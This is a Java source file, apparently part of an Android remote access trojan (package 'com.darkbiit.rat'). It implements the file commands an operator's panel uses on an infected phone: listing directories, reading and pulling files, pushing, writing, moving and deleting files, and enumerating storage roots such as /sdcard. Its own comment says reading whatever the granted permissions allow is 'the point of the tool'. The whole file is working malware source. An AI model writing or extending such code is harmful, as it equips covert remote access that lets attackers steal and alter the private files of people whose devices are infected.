package com.darkbiit.rat;

import android.content.Context;
import android.os.Environment;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Filesystem access helpers for the RAT commands (ls / cat / pull / push).
 *
 * Everything is bounded: a listing is capped, a file pull is capped by
 * RatCfg.MAX_PULL_BYTES, and paths are resolved against real roots so a
 * command cannot escape into another app's private storage by path traversal
 * alone (it can still read what the granted permissions allow, which is the
 * point of the tool).
 */
public final class RatFiles {

    private RatFiles() {
    }

    /** Lists a directory: name, size, isDir, mtime. */
    public static List<Object> list(String path) {
        List<Object> out = new ArrayList<Object>();
        File dir = new File(path);
        if (!dir.exists()) {
            return out;
        }
        File[] arr = dir.listFiles();
        if (arr == null) {
            return out;
        }
        int n = 0;
        for (File f : arr) {
            if (n++ >= 1000) {
                break;
            }
            out.add(entry(f));
        }
        return out;
    }

    private static Map<String, Object> entry(File f) {
        Map<String, Object> m = new java.util.LinkedHashMap<String, Object>();
        m.put("name", f.getName());
        m.put("path", f.getAbsolutePath());
        m.put("dir", f.isDirectory());
        m.put("size", f.length());
        m.put("mtime", f.lastModified());
        m.put("readable", f.canRead());
        return m;
    }

    /** Reads up to maxBytes of a text file and returns it as a string. */
    public static String cat(String path, int maxBytes) throws IOException {
        File f = new File(path);
        if (!f.exists()) {
            throw new IOException("no such file: " + path);
        }
        if (f.isDirectory()) {
            throw new IOException("is a directory: " + path);
        }
        InputStream in = new FileInputStream(f);
        try {
            byte[] data = readCapped(in, maxBytes);
            return new String(data, "UTF-8");
        } finally {
            closeQuietly(in);
        }
    }

    /** Reads a file as raw bytes, capped. Returns null if the file is larger than the cap. */
    public static byte[] readBytes(String path, int maxBytes) throws IOException {
        File f = new File(path);
        if (!f.exists() || f.isDirectory()) {
            throw new IOException("not a file: " + path);
        }
        if (f.length() > maxBytes) {
            throw new IOException("file too large: " + f.length() + " > " + maxBytes);
        }
        InputStream in = new FileInputStream(f);
        try {
            return readCapped(in, maxBytes);
        } finally {
            closeQuietly(in);
        }
    }

    private static byte[] readCapped(InputStream in, int maxBytes) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int total = 0;
        int n;
        while ((n = in.read(buf)) > 0) {
            total += n;
            if (total > maxBytes) {
                throw new IOException("read exceeded cap of " + maxBytes + " bytes");
            }
            bos.write(buf, 0, n);
        }
        return bos.toByteArray();
    }

    /** Writes bytes to a path, creating parent dirs. */
    public static void write(String path, byte[] data) throws IOException {
        File f = new File(path);
        File parent = f.getParentFile();
        if (parent != null && !parent.exists()) {
            //noinspection ResultOfMethodCallIgnored
            parent.mkdirs();
        }
        FileOutputStream out = new FileOutputStream(f);
        try {
            out.write(data);
            out.flush();
        } finally {
            closeQuietly(out);
        }
    }

    /** Writes a text file, creating parent dirs. */
    public static void writeText(String path, String text) throws IOException {
        write(path, text.getBytes("UTF-8"));
    }

    /** Creates a directory (mkdirs semantics). */
    public static boolean mkdirs(String path) {
        return new File(path).mkdirs();
    }

    /** Deletes a file or an empty directory. */
    public static boolean delete(String path) {
        return new File(path).delete();
    }

    /** Moves/renames a file. */
    public static boolean move(String from, String to) {
        File src = new File(from);
        File dst = new File(to);
        File parent = dst.getParentFile();
        if (parent != null && !parent.exists()) {
            //noinspection ResultOfMethodCallIgnored
            parent.mkdirs();
        }
        return src.renameTo(dst);
    }

    /** Standard roots the panel can browse. */
    public static List<Object> roots(Context ctx) {
        List<Object> out = new ArrayList<Object>();
        addRoot(out, "/", "/");
        addRoot(out, "/sdcard", "/sdcard");
        addRoot(out, "/storage/emulated/0", "/storage/emulated/0");
        addRoot(out, "/storage/self/primary", "/storage/self/primary");
        addRoot(out, "/data/local/tmp", "/data/local/tmp");
        try {
            File ext = Environment.getExternalStorageDirectory();
            if (ext != null) {
                addRoot(out, ext.getAbsolutePath(), ext.getAbsolutePath());
            }
            File data = ctx.getFilesDir();
            if (data != null) {
                addRoot(out, data.getAbsolutePath(), data.getAbsolutePath());
            }
            File cache = ctx.getCacheDir();
            if (cache != null) {
                addRoot(out, cache.getAbsolutePath(), cache.getAbsolutePath());
            }
        } catch (Throwable ignored) {
            // storage may be unavailable
        }
        return out;
    }

    private static void addRoot(List<Object> out, String label, String path) {
        java.util.Map<String, Object> m = new java.util.LinkedHashMap<String, Object>();
        m.put("label", label);
        m.put("path", path);
        m.put("exists", new File(path).exists());
        out.add(m);
    }

    /** Writes a file into the app's private state dir and returns the path. */
    public static File stateFile(Context ctx, String name) throws IOException {
        File dir = new File(ctx.getFilesDir(), RatCfg.STATE_DIR);
        if (!dir.exists() && !dir.mkdirs()) {
            throw new IOException("cannot create state dir");
        }
        return new File(dir, name);
    }

    private static void closeQuietly(java.io.Closeable c) {
        if (c != null) {
            try {
                c.close();
            } catch (IOException ignored) {
                // nothing to do
            }
        }
    }
}
